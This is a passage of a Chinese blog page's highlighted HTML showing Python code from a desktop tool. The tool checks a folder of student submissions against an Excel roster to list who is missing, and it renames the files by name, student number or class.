punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\tdata_total <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>data_name<span class=\"token punctuation\">,</span> data_stunum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#合并字典，检查名单</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token comment\">#pprint(data_total)  #check</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'缺勤/未上交名单：'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\tname <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\tflag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\tn <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\ttemp_name <span class=\"token operator\">=</span> data_name<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\ttemp_stunum <span class=\"token operator\">=</span> data_stunum<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\ttemp_fullname <span class=\"token operator\">=</span> data_fullname<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\ttemp_excel1 <span class=\"token operator\">=</span> temp_name<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\ttemp_excel2 <span class=\"token operator\">=</span> temp_stunum<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\ttemp_excel3 <span class=\"token operator\">=</span> temp_fullname<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> temp_file <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> temp_excel2 <span class=\"token keyword\">in</span> temp_file <span class=\"token keyword\">or</span> temp_excel3 <span class=\"token keyword\">in</span> temp_file <span class=\"token keyword\">or</span> temp_excel1 <span class=\"token keyword\">in</span> temp_file <span class=\"token punctuation\">:</span>  <span class=\"token comment\">#check name or stunum</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t\t\t\tflag <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t\t\t\tflag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> flag <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t\tstuid<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>temp_excel2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t\tstuname<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>temp_excel1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t\tstufullname<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>temp_excel3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t\tn <span class=\"token operator\">=</span> n <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'无 缺勤/未上交 者'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\tmessagebox<span class=\"token punctuation\">.</span>showinfo<span class=\"token punctuation\">(</span><span class=\"token string\">'完成！'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'无 缺勤/未上交 者！'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li><strong>改名功能（主要算法）</strong></li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wb <span class=\"token operator\">=</span> xlrd<span class=\"token punctuation\">.</span>open_workbook<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t\t\tws <span class=\"token operator\">=</span> wb<span class=\"token punctuation\">.</span>sheet_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'Sheet1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t\t\tdata_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#名字简写</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t\tdata_stunum <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#学号</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t\tdata_fullname <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#全名</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t\tdata_total <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">#check list</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t\tform <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>e2<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t\tselfdef <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>e3<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> <span class=\"token builtin\">len</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>nrows<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#excel 第一列放姓名，第二列放学号</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\tdata_name<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t\tdata_stunum<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t\tdata_fullname<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\t\tdata_total <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>data_name<span class=\"token punctuation\">,</span> data_stunum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#合并字典，检查名单</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token comment\">#pprint(data_total)  #check</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\ttemp_name <span class=\"token operator\">=</span> data_name<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\ttemp_stunum <span class=\"token operator\">=</span> data_stunum<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\ttemp_fullname <span class=\"token operator\">=</span> data_fullname<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"如果需要文件重命名，请选择命名格式：\\n班级可自行输入:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\tswitch <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名学号：张三20201305999'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名+学号：张三+20201305999'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名-学号：张三-20201305999'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t\t\t<span class=\"token string\">'4'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'班级姓名：信安20-3张三'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名学号：张三20201305999（名字简写）'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t\t<span class=\"token string\">'6'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名+学号：张三+20201305999（名字简写）'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'7'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名-学号：张三-20201305999（名字简写）'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t\t\t<span class=\"token string\">'8'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'班级姓名：信安20-3张三(名字简写)'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'姓名：张三'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'学号：20201305999'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token keyword\">or</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">8</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入班级：（例 信安20-3）'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t\t\tclasses <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>e1<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t\tname <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t\t<span class=\"token comment\">#pprint(name)  #check</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t\ttemp_excel1 <span class=\"token operator\">=</span> temp_name<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t\t\ttemp_excel2 <span class=\"token operator\">=</span> temp_stunum<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t\ttemp_excel3 <span class=\"token operator\">=</span> temp_fullname<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>   <span class=\"token comment\">#张三 20201305999</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>    <span class=\"token comment\">#张三 + 20201305999</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>    <span class=\"token comment\">#张三 - 20201305999</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>classes<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>  <span class=\"token comment\">#信安 20-3 张三</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel1<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>    <span class=\"token comment\">#张三 (简写) 20201305999</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>    <span class=\"token comment\">#张三 (简写)+20201305999</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">7</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>    <span class=\"token comment\">#张三 (简写)-20201305999</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">8</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>classes<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>  <span class=\"token comment\">#信安 20-3 张三 (简写)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">9</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>  <span class=\"token comment\">#张三</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t\t\t\t tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>temp_excel2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>  <span class=\"token comment\">#20201305999</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>select <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">if</span> selfdef <span class=\"token operator\">!=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t\t\t\t\tnew1 <span class=\"token operator\">=</span> selfdef<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;fname&#125;\"</span><span class=\"token punctuation\">,</span>temp_excel3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t\t\t\t\tnew2 <span class=\"token operator\">=</span> new1<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;sname&#125;\"</span><span class=\"token punctuation\">,</span>temp_excel1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t\t\t\t\tnew3 <span class=\"token operator\">=</span> new2<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;num&#125;\"</span><span class=\"token punctuation\">,</span>temp_excel2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>new3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\t\t\t\t\ttnew_file <span class=\"token operator\">=</span> new3</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t\t\t\t\t\tmessagebox<span class=\"token punctuation\">.</span>showinfo<span class=\"token punctuation\">(</span><span class=\"token string\">'警告！'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'自定义为空'</span><span class=\"token punctuation\">)</span>                               </pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">for</span> temp_file <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span>  <span class=\"token comment\">############## 这里选择这种写法是为了水代码行，懒得修改了，见谅 ################</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">'.zip'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.zip\"</span></span>    <span class=\"token comment\">#判断源文件的格式并保留，只写了常用格式</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.jpg'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.jpg\"</span></span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.jpeg'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.jpeg\"</span></span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.docx'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.docx\"</span></span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.rar'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.rar\"</span></span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.7z'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.7z\"</span></span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.xlsx'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.xlsx\"</span></span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t\t\t\t\t<span 